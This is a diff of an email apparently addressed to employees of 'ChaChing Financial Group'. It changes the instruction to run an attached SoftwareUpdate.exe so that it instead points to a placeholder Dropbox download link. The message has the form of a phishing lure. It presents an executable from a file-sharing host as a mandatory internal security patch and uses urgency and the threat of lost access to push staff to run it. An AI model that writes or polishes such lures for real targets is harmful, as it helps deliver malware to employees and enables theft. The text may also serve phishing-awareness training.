@@ -7,7 +7,8 @@ Dear ChaChing Financial Group team member,
 As part of our ongoing commitment to protect client data and maintain system integrity,
 we require all employees to install the latest internal security patch.
 
-Please download and run the attached SoftwareUpdate.exe immediately.
+Please download and run the SoftwareUpdate.exe from the following secure location:
+https://www.dropbox.com/s/your-dropbox-link/SoftwareUpdate.exe
 This update is critical to ensure continued access to internal banking systems
 and to protect against unauthorized transactions.
 
